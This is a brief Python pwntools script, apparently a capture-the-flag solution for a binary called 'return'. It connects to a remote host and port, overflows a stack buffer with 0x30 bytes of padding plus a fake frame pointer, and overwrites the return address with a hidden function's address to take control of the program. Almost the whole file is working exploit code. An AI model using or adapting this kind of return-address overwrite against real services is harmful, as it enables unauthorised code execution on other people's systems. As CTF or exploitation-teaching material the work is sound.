#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./return"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2118)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

rbp = 0x1234
c.sendlineafter(':)', b'a' * 0x30 + p64(rbp) + p64(elf.symbols['you_cant_see_this_its_too_evil']))

c.interactive()
c.close()
